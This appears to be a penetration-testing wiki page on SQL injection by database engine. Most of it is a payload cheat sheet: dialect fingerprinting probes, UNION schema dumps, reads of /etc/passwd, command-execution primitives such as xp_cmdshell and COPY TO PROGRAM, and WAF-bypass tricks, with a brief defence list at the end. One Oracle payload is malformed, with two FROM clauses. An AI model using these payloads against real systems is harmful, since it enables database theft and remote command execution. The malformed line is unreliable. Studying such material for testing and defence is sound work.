---
title: SQLi by database (MySQL / Postgres / Oracle / MSSQL)
slug: sql-injection-by-database
---

> **TL;DR:** Syntax and primitives differ per RDBMS — version, comment style, string concat, file read, UDF / xp_cmdshell exec.

## What it is
Once you have an injection point (see [[sql-injection]]) the next question is *which* engine — every payload past the initial probe depends on the exact dialect. Function names, string concatenation operator, comment markers, error format, time delay, file read primitive, and OS command path all differ. Picking the wrong dialect wastes payload budget and trips WAFs unnecessarily.

## Preconditions / where it applies
- Confirmed boolean / error / time / union injection
- Need to fingerprint the backend before crafting the data-extraction or RCE chain
- Often a WAF blocks generic strings — dialect-specific equivalents bypass

## Technique
**Fingerprint.** Send the same trick in each dialect and watch for one that does not error:

| Dialect | Version probe | String concat | Comment | Time delay |
|---|---|---|---|---|
| MySQL/MariaDB | `@@version` | `CONCAT('a','b')` or `'a' 'b'` | `-- ` / `#` / `/*!`...`*/` | `SLEEP(5)` |
| PostgreSQL | `version()` | `'a' \|\| 'b'` | `--` / `/*…*/` | `pg_sleep(5)` |
| MSSQL | `@@version` | `'a' + 'b'` | `--` | `WAITFOR DELAY '0:0:5'` |
| Oracle | `(SELECT banner FROM v$version)` | `'a' \|\| 'b'` | `--` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
| SQLite | `sqlite_version()` | `'a' \|\| 'b'` | `--` | `randomblob(100000000)` cpu burn |

**Schema discovery.**

```sql
-- MySQL
UNION SELECT table_name,column_name FROM information_schema.columns
-- Postgres (same, plus)
UNION SELECT tablename,NULL FROM pg_tables
-- MSSQL
UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'
-- Oracle (must SELECT FROM dual)
UNION SELECT table_name,NULL FROM all_tables FROM dual
```

**File read.**

```sql
-- MySQL (FILE priv + secure_file_priv permissive)
SELECT LOAD_FILE('/etc/passwd')
-- Postgres (superuser)
COPY (SELECT '') TO PROGRAM 'id > /tmp/x'   -- RCE
SELECT pg_read_file('/etc/passwd')
-- MSSQL
BULK INSERT t FROM 'c:\temp\file'
-- Oracle
SELECT UTL_FILE.FOPEN(...)                   -- DIRECTORY object req
```

**RCE primitives.**

- MSSQL: `EXEC xp_cmdshell 'whoami'` (enable via `sp_configure` if disabled)
- Postgres: `CREATE FUNCTION sys(text) RETURNS int AS '/lib/libc.so','system' LANGUAGE C` (super), or `COPY ... TO PROGRAM`
- MySQL: write UDF .so to `@@plugin_dir`, `CREATE FUNCTION sys_exec`
- Oracle: Java stored procedure or DBMS_SCHEDULER job

**WAF-bypass dialect tricks.** MySQL inline comments `/*!50000UNION*/`, scientific notation `1.e(0x1)`, MSSQL `EXEC('SEL'+'ECT 1')`, Postgres dollar-quoting `$$select$$`.

Related: [[nosql-injection]], [[waf-bypass]], [[rce-class]].

## Detection and defence
- Parameterised queries / prepared statements — strict end of conversation
- Least-privilege DB users: no FILE, no xp_cmdshell, no PROGRAM, no superuser
- Disable risky modules at the engine (`xp_cmdshell` off, `secure_file_priv` to read-only dir)
- WAF rules per dialect — generic SQLi signatures miss `/*!`, `$$`, `WAITFOR`
- Log query errors with stack — error-based SQLi is loud if you read them

## References
- [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) — per-dialect payloads
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — dialect-specific files
- [HackTricks — SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) — engine fingerprints
